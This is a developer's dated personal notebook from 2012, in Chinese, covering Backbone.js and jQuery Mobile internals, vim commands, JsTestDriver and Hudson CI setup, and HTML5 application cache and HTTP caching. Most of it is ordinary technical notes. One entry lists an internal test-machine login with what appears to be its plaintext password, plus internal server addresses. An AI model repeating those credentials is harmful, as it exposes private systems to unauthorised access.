View有$方法，以$el为上下文查找子selector，可以this.$(selector)调用。
View的events是delegate方式的

同级controller负责创建同级的view与model，可以没有model。

// Underscore methods that we want to implement on the Collection.
var methods = ['forEach', 'each', 'map', 'reduce', 'reduceRight', 'find',
'detect', 'filter', 'select', 'reject', 'every', 'all', 'some', 'any',
'include', 'contains', 'invoke', 'max', 'min', 'sortBy', 'sortedIndex',
'toArray', 'size', 'first', 'initial', 'rest', 'last', 'without', 'indexOf',
'shuffle', 'lastIndexOf', 'isEmpty', 'groupBy'];

_.toArray(arguments)，进行数组化
2012/9/7
switchingOrder的管理
C自动new出view和model的需求

controller如何复用？

父级controller负责下一级controller的创建，下一级controller再负责下下一级controller的创建。不进行跨级创建。

autoindent在vimrc里的前后出现位置有关系，何解？和:set paste有关

Model的url函数，或者url属性，不能为空值，否则fetch会报错。
Model的get方法，可以获取属性值，Collection与Model都有toJSON方法。

underscore的模板，支持对象属性获取方式。

http://bai360du.net/index.php
对比搜索

wpp build文件的查找目录，以wpp的工作目录为准，而不是build文件本身位置为准。

View的构造，(options)
Collection的构造，(models, options)
Model的构造，(attributes, options)

触发系统运转，有hashchange、user action、异步请求状态变化、定时器等原生事件，以及此基础上二次派生的自定义事件。
第一次打开，和hashchange有关，由此进行一次页面初始化加载和渲染的工作流；
后续进入原生事件响应工作流，响应过程中可能派生自定义事件。

自定义事件，使模块充分解耦。模块需要高内聚，能自治。

以首次加载工作流为主线，完成加载工作流
稳定后，进行交互响应工作流

目标：多人开发、持续集成、清晰上下文

加载工作流：Router、Controller、Model、View、EventCenter
交互响应工作流：Events、EventCenter

事件：全局事件和局部事件。成为全局事件有准入门槛，必须认为是全局的才能成为全局。

页面结构：page、component
切换级别：
2012/9/6
Backbone.Model使用RESTful URL，我们可能需要覆盖其url方法。
Backbone.Collection是Model的集合，有model，models，length等属性，model属性是Model类，models属性是Model类实例的数组
Backbone.View，model属性是Model实例或者Collection实例。
View可能有这些属性，model，collection，el，id，attributes，className，tagName。

collection的reset事件触发方式：
if (!options.silent) this.trigger('reset', this, options)
带两个参数，this，options。难怪listMain的render方法中判断model是否存在，误打误撞存在了。

add事件怎么触发的？refresh有关。

传递给newsListMain的model是一个collection，listmain监听collection的reset事件，触发后进行render，render时创建newsList，并将collection往下传，往下再调用newsList的render，该render再创建newsListItem，并render。


事件派发，事件名称以及要携带的参数
CMV的对应关系，1C-1M-1V，可以包含多个子CMV，形成树状关系。

backbone.Events，实现一个事件机制，提供on，off，trigger功能。比较简单，每个对象自己有一个事件管理机制。jQuery是统一一个事件管理机制。

CTRL_W r，交换窗口

http://css3pie.com/
使的ie6-9也能用css3。利用css的behavior属性，引入.htc文件。

jQuery.Event，每个handler会赋予guid，方便remove
事件处理器对象，handleObj = jQuery.extend({
                type: type,
                origType: tns[1],
                data: data,
                handler: handler,
                guid: handler.guid,
                selector: selector,
                quick: selector && quickParse( selector ),
                namespace: namespaces.join(".")
            }, handleObjIn );
事件处理器队列，以下是某个事件队列的初始化。
handlers = events[ type ] = [];

不在special里，则直接使用原生方式注册。
handleObj会添加到handlers里面。
事件路径的概念，支持bubble，preventDefault等功能。事件路径沿着DOM树往上传递，到document，再到window。
所以，$(document).bind()，可以监听到在各个对象上trigger的事件。
jQuery对象如果要监听全局事件，可以通过在模块代码内调用$(document).bind来进行。所以document可以认为扮演广播消息接收者的角色。

jQuery.fn.on调用jQuery.event.add(elem, types, handler, data, selector)
jQuery.fn.trigger(type)，触发对象本身的事件，不是全局事件。

Alex，T7以下都得写程序。Google的牛人不是那么会说，但人家动手能力强。真正牛的系统都是牛人做出来的，不是说出来的。百度，升T5以后就不写代码了，不行，太浮了。

2012二季度中国手机搜索内容分布:地图占31.4%
http://it.gmw.cn/2012-09/04/content_4974358.htm
百度浏览器3.2%，UC，40+%，QQ第二

:args *
:args *.js
:args my_c*.js
设置参数列表，:argdo与其配合使用，针对文件进行逐一操作。比如全局替换、编码转换等。
:args *.js
:argdo set ff=unix | update
ff = fileformat
查找option的好方法，:help ‘ff’，单引号括起来

查看一批文件的文件编码：
:args **/*.js
:argdo set fenc
可能有utf-8，euc-cn, latin1等

文件批量替换，将.js文件的console.log注释掉：magic模式正则
:args **/*.js
:argdo %s/\(^ \{2,}\)\(console\)/\1\/\/ \2/g | up


:colorscheme koehler
gvim下还不错。

webkit制作的cygwin下载包，svn客户端等都集成了：
http://svn.webkit.org/repository/webkit/trunk/Tools/CygwinDownloader/cygwin-downloader.zip


首页的性能，瞬时压力变大，服务器可能扛不住。RESTful API，lazyload，依赖框架啊

webkit有两个加载流水线，第一个加载document，第二个加载子资源，比如图片、脚本等。
2012/9/5
bat shell，C++
应该再学点perl， python
技术视野要广

LBSWEB-永霞<vanillalyx> 20:53:15 回复
一个webapp重复操作一个检索操作1个小时，内存上升100M，这正常么
http://map.baidu.com/mobile/
测试手机，htc g12 android 2.3

jQuery的end()，在链式调用里面，回到上一次过滤集合中。内部用栈来实现。

var jQuery = function( selector, context ) {
  return new jQuery.fn.init( selector, context, rootjQuery );
}

淘宝ued的智勇大冲关题目：
http://ued.taobao.com/quiz/ 

jQuery Mobile预定义的页面事件：
tools\log-page-events.js|21 col 191| var pageEvents = "mobileinit pagebeforechange pagechange pagechangefailed pagebeforeload pageload pageloadfailed pagebeforecreate pagecreate pageinit pagebeforeshow pageshow pagebeforehide pagehide pageremove"

jQuery Mobile：
1. 面向对象，部分方法实现得比较彻底。
2. 事件机制，trigger，事件全小写，会有统一前缀。
3. dataset机制，通过_getCreateOptions加载到创建过程中
4. css样式有标准
5. theme机制

    window.scrollTo( 0, ypos );
    $( document ).trigger( "silentscroll", { x: 0, y: ypos });
jQuery Mobile，滚动以后，触发一个silentscroll事件。貌似没有全局事件中心的概念。每个widget都有widgetEventPrefix，在trigger的时候，会把前缀加上。trigger最终还是落到widget的element的trigger方法上。


$.extend( {}, prototype ) 可以返回新对象。
jQueryMobile，面向对象的程度较深。

$.widget方法，用于创建ui类。(name, base, prototype)，内部创建一个constructor类，并通过$[namespace][name]挂载。
$.Widget类（方法），是ui类的基类。重点实现了_createWidget方法，该方法在实例化每个类的时候会被调用。其内部调用了_create、_init等方法，并触发create事件。
_createWidget(options, element)，参数列表与类实例化时一样，因为类实例化调用的就是它。这里的options会被merge进类实例属性this.options：
this.options = $.widget.extend( {},
    this.options,
    this._getCreateOptions(),
    options );


$.mobile.widget是所有mobile ui的基类，其中重点实现了_createWidget, _getCreateOptions等方法，_createWidget还会调用父类$.Widget的实现，并触发init事件。比如$.mobile.page：
$.widget( "mobile.page", $.mobile.widget, {...});
_getCreateOptions会从element的dataset中获取数据。

子类的每个方法是对父类的重写，不会自动调用。
每个具体的widget主要重点实现_create方法。比如page，会实现_create方法，覆盖父类的_create方法，是一个空函数，覆盖也没事儿。

page的_create方法，触发beforecreate，监听pagebeforeshow, pagebeforehide事件。

jquery.mobile.init，用于初始化，document触发mobileinit事件，初始化loading DOM，定义第一张页面，$.mobile.firstPage，$window触发pagecontainercreate事件，注册内部事件，通过$.mobile._registerInternalEvents，scrollTo(0,1)，

$(window)，多次调用是否会多次创建？会的。
但是对jQuery.fn.data()的调用，多次创建的实例返回的值是一致的，共享的。会放到dom对象上。

navbar类，主要实现_create方法，都是用setup方式。

navigation，相当于router

$不是全局的，对于Zepto来说，jQuery的$才是全局的。

http://m.hornady.com  体验不好，没有自包含，切换效果生硬
http://pttrns.com/ 移动UI设计，相当不错。可以触发灵感。inspiration


ant和maven等都是build工具


http://www.bobmccune.com/2006/12/09/unit-testing-best-practices/ 
测试行为，而不是方法。私有方法没必要做单测。除非该私有方法足够复杂，且很有必要做单测。
100%的覆盖率没有必要，特别对于一些特别简单的方法，比如getter/setter等。
测试用例的面向对象实践，通用功能的测试写成基类，复杂的测试进行分解
使用恰到好处的测试方法名，test开头，方法名表义
不要使用try...catch，捕获非预期的异常（unexpected），交由框架处理
不要依赖眼睛所见的测试
使用一个代码覆盖率工具



不要将jstestdriver.console.log等用简写来代替，因为会被作为特殊字段被替换掉。
比如
var log = jstestdriver.console.log;
log(‘hello’);

百谷歌度，同时搜索，有点创意。如果能把谷歌的抽风绕过更好。
http://baigoogledu.com/ 
2012/9/4
个人工具：myencrypt，C++编写

测试方法名必须以test为前缀。

vim自动断行，因为设置了tw，textwidth，:set tw=0，可以暂时解决

jenkins在fe2机器没有安装成功。

hudson配置，基本功能，定时编译，部署，单测。重要核心功能是其生成的reports。使用以下两个Post-build Action：
Publish JUnit test result report，显示jsTestDriver单测的结果
Publish HTML reports，显示jsTestDriver的coverage插件的结果，中间需要自己genhtml一把

目前还没有整体的代码覆盖统计，只显示单次。

使用genhtml -f，需要安装perl组件GD.pm。没装成。

直接自己动手修改，生成的reports文件，子目录文件相对路径计算有误，修改了genhtml的2232行，为：
$result .= "./";                                                                                                           
for (; $index>=1; $index--)

lcov，linux下计算覆盖率的命令，包含genhtml等命令。
http://downloads.sourceforge.net/ltp/lcov-1.9.tar.gz


Qunit，jQuery提供的JS单测工具

--testOutput VAL，设置输出目录，JsTestDriver输出XML格式的单测结果

jsTestDriver插件，用于计算coverage。
http://js-test-driver.googlecode.com/files/coverage-1.3.4.b.jar
放在plugins目录下，并在jsTestDriver.conf文件中配置。
2012/9/3
http://www.jsunit.net/
jsunit不适合持续集成，因其编写HTML页面，并在浏览器里运行的模式。

if [[ “$a” -eq “$b” ]]; then
  ...
fi
[[和]]是关键字，不是命令。前后需要留空白。
(( ))，数字比较表达式。
[ ]，最普通的比较表达式


which，列出shell命令的全路径
whereis，定位一个命令的二进制，源码，手册的位置

jsTestDriver
src和src-test目录，以及jsTestDriver.conf文件。配置文件是YAML格式。
具体格式：http://code.google.com/p/js-test-driver/wiki/ConfigurationFile 
支持section：server，load，test，exclude，serve，proxy，plugin，timeout
load：在test case运行前装载进来运行的代码。可以是外部脚本
test：测试代码
exclude：不load的代码
proxy：设置代理，matcher，server字段。
plugin：装载插件，比如coverage.jar插件
timeout：
server: http://localhost:8877                                                                           
                                                                                                        
load:                                                                                                   
  - src/*.js                                                                                                                        
  - src-test/*.js

proxy:
 - {matcher: "*", server: "http://localhost/whatever"}
$ java -jar /home/work/softwares/JsTestDriver/JsTestDriver-1.3.4.b.jar --port 8877
启动服务，浏览器访问，并capture，使浏览器成为测试服务器，可以capture多个浏览器。
$ java -jar /home/work/softwares/JsTestDriver/JsTestDriver-1.3.4.b.jar --tests all
启动服务完毕的情况下，启动测试，可以从浏览器中获取测试结果。

jsTestDriver，使得Junit方式的单元测试用在了JS上面。编写单测用例同Junit。
通过--browser option，指定相关浏览器可执行文件路径，可以一次性获得单测结果。其他情况，比如要测不同终端，服务器又无法安装的浏览器，使用capture方式。
--runerMode VAL，配置运行模式，DEBUG、DEBUG_NO_TRACE、DEBUG_OBSERVE、PROFILE、QUIET、INFO
--captureConsole，配置是否抓取浏览器console的输出。

测试用例怎么写：http://code.google.com/p/js-test-driver/wiki/TestCase
使用编写测试类的方式，prototype链或者内联方式声明test mothod。
测试类必须通过字符串标识提供，比如：
MyTestCase = TestCase("MyTestCase");
类名与标识名必须一致。
每个测试的生命周期：new一个TestCase的实例，执行setUp()，执行testMethod()，最后执行tearDown()。
由Asserts组成：
expectAsserts(count)
fail([msg])
assertTrue([msg], actual)
assertFalse([msg], actual)
assertEquals([msg], expected, actual)
assertSame([msg], expected, actual)
assertNotSame([msg], expected, actual)
assertNull([msg], actual)
assertNotNull([msg], actual)

AsyncTestCase支持异步测试API，使用队列机制。
queue.call()方法，以及callbacks.add()方法。queue是传给测试方法的参数，callbacks传给queue.call方法的第二个参数指定的匿名函数。
queue.call用于任务排队，callbacks.add用于每个任务中子任务的添加。前一个任务的所有子任务都完成以后，后一个任务才会被调度。所有排队的任务都确保会被执行，特别是针对异步执行的任务。

IMG08机器：
img@tc-apptest-img08.vm
MhxzKhl

http://tc-apptest-img08.vm.baidu.com:8077
代理服务器

vs_proxy.php
/home/img/hudamin/softwares/Apache-2.2.13/htdocs

img08上的svn server， http://tc-apptest-img08.vm.baidu.com:8021/svn/repos/ 
svnadmin进行管理，在~/softwares/svn/repos目录下


在Linux的命令行底下，一般的程序都是使用http_proxy和ftp_proxy这两个环境变量来获得代理设置的。
export http_proxy=http://username:password@proxyserver:port/
export ftp_proxy=http://username:password@proxyserver:port/
如果你的代理服务器需要用户名和密码才能访问，需要填写上面的username和passwd部分，否则的话，省略这两部分。
export no_proxy=”localhost,127.0.0.0/8,*.local”
例如，假设你的代理服务器为192.168.1.1，端口是8080，用户名为cnkker，密码是123456，那么应该这样设置这两个环境变量：
export http_proxy=http://cnkker:123456@192.168.1.1:8080
export ftp_proxy=http://cnkker:123456@192.168.1.1:8080
如果要使下次生效，需要把导出配置写入~/.bashrc中，这样配置之后，退出再登录一次，或者直接使用下面的命令source一下.bashrc：
source ~/.bashrc
现在，上述程序就可以通过代理服务器访问网络了。



Hudson，FIS也在用，http://hudson-ci.org/
安装简单，配置简单
环境简单，java 6及以上RT即可。

db-news-fe2.vm机器没有外网权限，需要配置代理服务器。在WEB界面下，系统管理-管理插件-高级-代理设置，配置代理服务器。直接使用img08的代理服务器，但请直接设置img08机器的ip地址，域名不work。

Hudson和Jenkins，前者Oracle维护，后者Jenkins，是Hudson的一个分支，比Hudson发展更快。两者都具备持续集成所需的最重要特征。选择哪个，只看自己的喜好。Hudson目前已经被Oracle捐献给Eclipse基金维护了。
Jenkins，http://jenkins-ci.org/ ，最新版本1.479

持续集成工具，重要的是其产出的数据和报表，而不是服务器本身。

多人合作开发，单元测试自动运行。

$ java -jar hudson-2.2.1.war --httpPort=8855
运行hudson，命令行模式，默认端口为8080，可以指定。
$ java -jar hudson-2.2.1.war --httpPort 8855 --daemon
后台运行。
自动生成运行目录，~/.hudson
插件所在目录：~/.hudson/plugins


http://www.eclipse.org/hudson/download.php
下载地址，当前版本2.2.1，MIT许可，非Eclipse环境能运行。3.0版本，Eclipse许可，需要Eclipse环境才能运行。从hudson-ci.org和java.net转向eclipse.org+java.net。

http://engineering.linkedin.com/testing/continuous-integration-mobile
移动开发，使用持续集成的例子。
5阶段持续集成流水线：单元测试、数据测试、布局测试、部署及端对端测试。性能测试后续会包含进来，phantomjs and Qt/QtWebkit (http://qt.gitorious.org/qt)
使用Hudson作为CI服务器
单元测试，使用JsTestDriver，少数的支持持续集成的JS单元测试框架之一
布局测试，图片快照对比，使用WebKit Layout and Rendering，http://www.webkit.org/coding/technical-articles.html

端对端测试框架，Selenium WebDriver和TestNg，使用iPhoneDriver使得测试能在iPhone模拟器上运行。AndroidDriver还存在一些问题。

http://code.google.com/p/js-test-driver/downloads/list
JsTestDriver，JsTestDriver-1.3.4.b.jar   4.1 MB
http://code.google.com/p/js-test-driver/wiki/GettingStarted
使用文档

REST(Representational State Transfer)，是一种网络应用的设计和开发方式，能降低系统开发的复杂性，提升系统的可伸缩性。5个原则：
1.网络上的所有事物都被抽象为资源（resource）； 
2.每个资源对应一个唯一的资源标识（resource identifier）；
3.通过通用的连接器接口（generic connector interface）对资源进行操作；
4.对资源的各种操作不会改变资源标识；
5.所有的操作都是无状态的（stateless）。
RESTful API

window.external&&window.external.twGetRunPath&&window.external.twGetRunPath().toLowerCase().indexOf("360se")>-1
判断360 PC浏览器的

Chrome的external包含两个方法：AddSearchProvider(name)和IsSearchProviderInstalled(name)
2012/8/31
以前代码：评论系统，hao123天气，投票系统，contentPlayer，ScrollView, carousel，myBDnews，iui，PHPUI，相册API
工具：IE Extensions，JSPreProcessor， McDebugger， Editplus Tools， myencrypt

最壮观的PHP正则表达式，hao123 weather的prefetch


APP控制器给出切换方向、当前视图、目标视图，放在全局事件中派发；
视图对象自己决定是否响应事件；
三个page视图，首页，正文页和检索结果页。首页page视图包含多个子视图。所以切换上有两个层级，page视图切换，子视图切换。
视图与模型为1对1或者n对1。

APP事件中心，是一个全局变量，可被任何对象持有。通过事件中心，任何对象可以将全局事件派发给关注该事件的对象。全局事件可以默认作为广播事件，也可要求需要主动注册，考虑到广播事件的效率问题，使用主动注册。
内部事件，也即非全局事件，务必不能通过事件中心来传递，可以使用内部提供的事件机制。


2012/8/30
为什么没有命令缓存，vim。viminfo文件是旧格式，无法使用。rm掉，让其重新生成即可。

看看自己以前的代码

jsloader，定时check更新
Using语法，利用空余时间将framework代码下载下来，cache在localstorage里。

appjs
npm install appjs
没法装，要rebuild一个什么东西，node-gyp，没有成功，提示需要vs c++ 2010。

优化的主要修改：
增加了一些meta，link
图片新增，startup图片
manifest文件新增
js文件修改

diff文件的格式：增删改
72,76c68,79 左边文件72到76行内容change成右边文件的68,79
<
<
---
>
>

93a97 右边文件在97行处比左边文件的93行处多了一行，右边多
97d93 左边多一行


E:\Softwares\UsefulSoftwares，是一些很有用的小工具，以做备份。

新旧版本的wpp，新版本升级了smarty，并且命令行做了扩充，支持JCC压缩。也修复了一些bug，比如内部使用compressor的时候，旧版本会有问题。可能和对proc_open函数的调用方式有关。

resource proc_open ( string $cmd , array $descriptorspec , array &$pipes [, string $cwd [, array $env [, array $other_options ]]] )
php函数，启动新进程运行。$cwd，当前运行目录，必须是绝对路径。

uc8.7在ios上彻底没有uc字段了

http://app.ft.com/
还是个响应式的样式设计，PC和移动端都能跑

scrollTo(0,1)， onload以后触发，PC端不用，对于hash值有效的情况部滚动，load前用户已经有滚动操作的不滚动。
http://remysharp.com/2010/08/05/doing-it-right-skipping-the-iphone-url-bar/


2012/8/29
当前对话中，应用缓存不会自动替换，已经下载的不会重新下载，已经执行的脚本不会重新下载再执行。但是可以捕获到，比较好的方式是提示用户是否现在更新，是的话就直接reload当前会话。

启动图片，参考刘骥的文档。总之会向下兼容，先满足320×460的，Retina(640*920)屏幕用JS进行append link标签搞定。

总有卡顿，refresh调的次数太多。
translateZ，启用硬件加速确实不一样。尽可能具体到最近的block元素。

加载不能点击：没有autoHeight
回切覆盖：去掉了z-index:9
回切顶部不缩回，且不能手动缩回：恢复#views的位置
swapCache：applicationCache的onupdateready事件
位置还原：
正文页性能：增加硬件加速；
2012/8/28
先上了manifest，再加上全屏功能。原先缓存的文件请求了两次。不知啥原因。后来更新了manifest，好了。需要引起注意。
再试了一次，老婆的4s，发现第一次打开页面，会请求两次，第一次200，第二次304.

服务器上manifest和文件同时更新，但是页面没有立即生效。第二次或者第三次打开才生效，虽然看日志已经请求了200。估计需要swapCache。

从详情页过来，首页顶部收不起来了。

状态栏，全屏情况下，导航被顶部栏遮盖掉一部分，无法使用。iPhone4，有问题。


img08机器上，有repos_softwares，和相关的svn服务器。

Apache-2.4.2是很新的版本，编译对机器已有库有要求，在img08机器编译不成功，但在db-news-fe2.vm机器可以。
Apache-2.2.13可以img08，与php-5.3.2可以搭配。

manifest文件必须UTF-8编码。必须将MIME类型设置为:text/cache-manifest
应用缓存文件的页面，会自动被离线缓存下来，即使不指定。
Note: Authors are encouraged to include the main page in the manifest also, but in practice the page that referenced the manifest is automatically cached even if it isn't explicitly mentioned.
http://www.w3.org/TR/html5/offline.html
Master项，表示通过manifest属性调用manifest文件的文档。
Manifest项，表示manifest文件本身
页面每次加载或者刷新都会请求manifest文件。仅当manifest文件的内容变化，manifest文件内的文件才会重新发起更新请求。manifest文件的时间戳发生改变不会触发文件更新。文件更新会受Browser Cache的影响。如果文件没有变化，还是304请求。
如果manifest设置了缓存，那就悲剧了。

被缓存的文件，chrome下也能看到，HTTP状态码是200，但是会在Size/Content列显示：（from cache）
 


Apache mod_headers
Header set
Header echo
Header merge
等

mod_mime
模块标识：mime_module
源文件：mod_mime.c
AddType text/cache-manifest .manifest



jsloader
http://www.meizz.com/scripts/mz.htm
方荣的测试页面。云代码

HTTP Cookie：http://www.ietf.org/rfc/rfc2109.txt
协议文档： http://tools.ietf.org/html/rfc2616
W3C的文档（HTML格式）：http://www.w3.org/Protocols/rfc2616/rfc2616.html
HTTP协议详解：CSDN：http://blog.csdn.net/gueter/article/details/1524447

HTTP1.1的cache设计目的，消除某些情况下的请求发送，或者消除某些情况下的全响应，只用部分响应，比如304，不传回实体，只有消息头。前者减少网络来回连接，可以使用expiration机制来达到；后者减少网络带宽需求，可以使用validation机制来达到。缓存如果起不到提升性能的目的，是没有任何用处的。

Cache-Control机制提供显式指令给HTTP Cache。该指令允许客户端或服务端传送各种不同的指令，在请求或响应中皆可。这些指令会覆盖默认的缓存算法。通常原则，如果头部值存在明显矛盾的时候，最严格的那个会被使用，也即最有可能保证语义透明的那条会被应用上。
但是，有些情况下，Cache-Control指令也用于降低语义透明的强度，比如public，max-stale。

客户端可以通过发送Cache-Control: max-age=0或 Cache-Control: no-cache头部，强迫更新缓存。

Last-Modified Dates头部，也是一个缓存验证器。从该值以来实体没有被修改过，那么缓存就是有效的。

Etag，Entity Tag头部，也是一个缓存验证器。

强验证器和弱验证器。只要实体变，相关的验证器都变，这些验证器叫做强验证器。那些在实体变化后，不是总变化的验证器，叫做弱验证器。Etag是强验证器，但是协议提供了一种机制，将Etag标识为弱验证器。可以认为，只要实体的字节内容有变化，就跟着变化的，是强验证器，只当实体的含义变化了，才跟着变化的，为弱验证器。
保存在稳定存储中，当实体变化就增加1的整数，是强验证器。
以秒为分辨率的修改时间，是弱验证器。

对弱验证器的支持是可选的，但是弱验证器能支持更加有效率的缓存。


请求头：
If-Modified-Since:Tue, 19 Jun 2012 10:55:51 GMT
响应头：
Last-Modified:Tue, 19 Jun 2012 10:55:51 GMT
表明缓存是有效的，不再返回内容。304

请求头：
If-None-Match:"17026-4c84d701f9e80"
响应头：
ETag:"17026-4c84d76ae1600"
表明缓存已经失效，返回新的实体内容。200

application cache 更新失败汇总
http://fe.baidu.com/doc/xiaoguang/application_cache/huizong.text

m.baidu.com/static/上manifest文件的响应头：
Accept-Ranges:bytes
Cache-Control:max-age=1
Content-Length:248
Content-Type:text/cache-manifest
Date:Tue, 28 Aug 2012 06:45:39 GMT
ETag:"1693485"
Expires:Tue, 28 Aug 2012 06:45:40 GMT
Last-Modified:Mon, 27 Aug 2012 05:12:46 GMT
Server:apache
max-age=1，客户端总是过期，基本认为是没有缓存。

http://m.baidu.com/static/index/innovation/cache.manifest
只是缓存了一些图片。统计图片不缓存。JS等直接在页面里。
CACHE MANIFEST
# v2012 08 27
http://m.baidu.com/static/index/i.gif
http://m.baidu.com/static/hb/hot.gif
http://m.baidu.com/static/index/logo_index2.png

NETWORK:
*
http://m.baidu.com/su
http://loc.map.baidu.com/wloc
http://m.baidu.com/static/tj.gif

http://m.baidu.com/static/index/i.gif
Response Header，该文件被manifest缓存。
Accept-Ranges:bytes
Cache-Control:max-age=31104000
Content-Length:929
Content-Type:image/gif
Date:Tue, 28 Aug 2012 03:43:24 GMT
ETag:"1855245"
Expires:Fri, 23 Aug 2013 03:43:24 GMT
Last-Modified:Wed, 28 Sep 2011 15:11:16 GMT
Server:apache



link标签也会发送请求，是一些隐藏的请求

http://app.ft.com/ftcachemanifest.manifest
CACHE MANIFEST
# r1295
/
/lib/img/startupscreen/splash-logo.png
/lib/img/startupscreen/splash-logo@2x.png
/lib/img/mini-headshots-sprite.png
/lib/fonts/MillerDisplay-Semibold.ttf
/lib/fonts/Clarion.ttf
/lib/fonts/Clarion-Bold.ttf
/lib/fonts/BentonSansRegular.ttf
/lib/fonts/BentonSansBold.ttf
/lib/fonts/BentonSansBlack.ttf
/lib/fonts/BentonSansLight.ttf
/lib/fonts/MillerDisplay-Roman.ttf
/lib/fonts/MillerDisplay-Bold.ttf
/lib/fonts/Clarion-Italic.ttf
/lib/fonts/BentonSansRegularItalic.ttf
/lib/fonts/MillerDisplay-Semibold.woff
/lib/fonts/Clarion.woff
/lib/fonts/Clarion-Bold.woff
/lib/fonts/BentonSansRegular.woff
/lib/fonts/BentonSansBold.woff
/lib/fonts/BentonSansBlack.woff
/lib/fonts/BentonSansLight.woff
/lib/fonts/MillerDisplay-Roman.woff
/lib/fonts/MillerDisplay-Bold.woff
/lib/fonts/Clarion-Italic.woff
/lib/fonts/BentonSansRegularItalic.woff
/favicon.ico

NETWORK:
*

其中，
http://app.ft.com//lib/img/startupscreen/splash-logo.png
Accept-Ranges:bytes
Age:0
Cache-Control:max-age=604801, public
Connection:keep-alive
Content-Length:24028
Content-Type:image/png
Date:Tue, 28 Aug 2012 03:48:36 GMT
ETag:"5ddc-4c2ea876c4c40"
Last-Modified:Wed, 20 Jun 2012 17:14:17 GMT
Via:1.1 varnish
X-Varnish:2154281994


http://www.html5rocks.com/en/tutorials/offline/whats-offline/ 阅读笔记：
offline apps：与云同步，但能在无网络连接的时候存活。比如过隧道，飞机上。

David Hanson
（http://37signals.com/svn/posts/347-youre-not-on-a-fucking-plane-and-if-you-are-it-doesnt-matter）你不要为了能在飞机上用，而去开发一个offline apps。成本大于收益。
但仍然还是有不少情况下，做一个离线应用是很值得的。离线应用有成本，但是成本被证明是值得付出的话，就可以做一个离线应用了。

离线技术支持缓存，以及对缓存过程的细节控制，因此，其可以使webapp快速启动，数据快速展现。

HTML5的两个主要的离线能力：application cache和offline storage。两者区别，核心应用逻辑和数据的区别。应用缓存包含将应用的核心逻辑和用户界面保存起来，离线存储关于用户产生数据，或者用户表现出兴趣的数据的存储。

对于一个web game来说，HTML，js，css，常用的icon和图片，声音文件等，就得用应用缓存来保留。第二次打开这个game的时候，速度变得很快。如果用户想再次回到上次退出时的场景，这时的数据就不是放在应用缓存中，因为这个数据是用户特定相关的（user-specific），得用离线存储来保存。

旧的离线存储技术。cookies，一个域名最多20个cookie，以及4kb的限制（http://www.ietf.org/rfc/rfc2109.txt），而且重要的是，降低网络质量，因为会来回传送。

基于插件的存储，Flash 6+的share object，java applet对本地文件的读取，Google Gears也可以。这也有一个缺点，你必须保证你装了插件，而且版本也是对的。而且插件的安装被企业防火墙阻止是很正常的事情。
浏览器特殊支持的特征，比如IE5+开始支持的UserData（ http://msdn.microsoft.com/en-us/library/ms531424(VS.85).aspx  ）。还有这么个jQuery插件：http://jquery.tiddlywiki.org/twFile.html

HTML5时代的离线存储。用更加开放和标准化的词汇来说——HTML5 Storage。不是所有浏览器都已经支持，所以旧的离线存储技术仍然是有用的，对于平滑降级来说。包括：Local Storage（或DOM Storage），Web SQL Database（简称SQL Storage）， IndexedDB，以及文件存储。所有这些都遵循同源策略，这些存储与源相关。

可以通过base64编码存储二进制数据，使用base64编码大概会增加30%的空间。
处理的离线数据太多的话，需要考虑单线程JS的执行效率，避免用户交互得不到响应。如果真的无法降低数据量，那么得考虑异步API。使用这些API，浏览器自动为你创建线程。
localstorage，是同步的，所以处理大量数据，是会降低响应速度的。而IndexedDB，WebSQL Database，File Writer等都同时具有同步和异步的支持。应该倾向异步模型，即使该模型使程序变得复杂。性能为先。

另外的，支持异步模型的方法，使用WebWorkers。但是localstorage的API通常不会再worker里面运行。如果更多的浏览器支持sharedworkers，情况会更好，因为这种worker限制更少。

web sql支持事务，indexedDB将来也会支持。

存取大数据，通常都有限制，一般为5M。没超过这个限制，没什么问题，但如果超过，要么1，不工作；2，浏览器要求更多的空间；3，浏览器检测特别配置，比如chrome插件的声明，unlimited_storage

检测是否在线。navigator.onLine()，在最新的IE，Firefox，Opera以及chrome都支持。也可监听该事件，
 document.body.addEventListener("online", function () {...} 
document.body.addEventListener("offline", function () {...}
满足两个目的，一个是确定错误是否由于网络问题引起，提示用户进入离线模式，二是监听online事件，及时回到在线模式。

结构化文件数据，FileSystem API，不过支持甚少。

用通用的接口，封装跨浏览器的兼容性问题。可以看persist-js：
https://github.com/jeremydurham/persist-js
比如store.save(id, data) ， store.findByIDs()等




关于数据隐私：http://ajaxpatterns.org/Host-Proof_Hosting


2012/8/27
http://gmu.baidu.com/compress/compressor.html
GMU

interpolate
underscore.js的模板引擎。http://underscorejs.org/#template
<%=...%>变量
<%...%>js代码
<%-...%>html编码

http://nus40g1.chinaw3.com/demos/galaxy/
志龙，矢量引擎，支持所有浏览器。SVG写的。

表格内插入tab，使用Ctrl+Tab即可

点击顶部状态栏，滚动至顶部，如何让iscroll也至顶部？

点击事件穿透？

点击加载更多，第二次点击无效，过会儿有效

导航栏收起有问题，用一段时间后不灵了

保持位置貌似不准，会自动跑到顶部。


通过改造，消除位置还原，更好的切屏效果。
#views
    header
        #menu
    #_lv
        #page
            #index_scroller
                #load-last
                #thelist
                    #list_healthnews
                    #list_socianews
                    ...
                #loadOlder
                .ui-refresh
                .footer
    #views
    header
        #menu
    #_lv
        #index_wrapper_finannews
            #index_scroller_finannews
                .load-last
                .loadOlder
                .index-list
                .ui-refresh
                .footer
        #index_wrapper_civilnews
            #index_scroller_civilnews
                ...
loadMore view里面new出$.ui.refresh组件

translate的时候，即使移开当前位置，只要display还是block，就还会遮住下面的内容。
低级错误，static定位的两个元素怎能平行呢？
2012/8/26
router首页入口，hashHandler：
首页列表类型
发送统计
scrollTo(0, 1)
展现UI组件，头部，导航栏（#menu），显示“首页返回顶部”，隐藏“检索返回顶部”，more2隐藏且关闭，页面工具栏隐藏（都得统一调度）
还原位置，包括#views，以及#index_scroller。
this._init()
移除错误提示
隐藏详情页和检索结果页工具栏，务必调用实例方法
获取栏目页相关静态数据，比如哪些栏目
生成navigator组件，以#menu为container，并放在window下，以topNavigator命名，#menu先展现，难怪会现有一个蓝色横线
navigator组件切换至对应tab
隐藏fontMenu
还原navigator的位置，如有缓存的，还原之，否则，保存之。
若当前栏目列表已存在，切换之，设置列表高度为列表项数×97，延时重置高度(autoHeight)，并还原位置。
若栏目列表不存在，iscroll滚动回顶部，显示加载。创建model，创建view，render，append至#news-list，切换之。添加loading动画，异步获取数据，model.fetch()
点击新闻列表项，头部折叠。
缓存model，在app.dataCache.index[type]中
初始化或更新“加载最新”的状态
初始化或更新“加载更多”的状态，更换model，更换option，启动加载最新的check
切换主框架#_lv




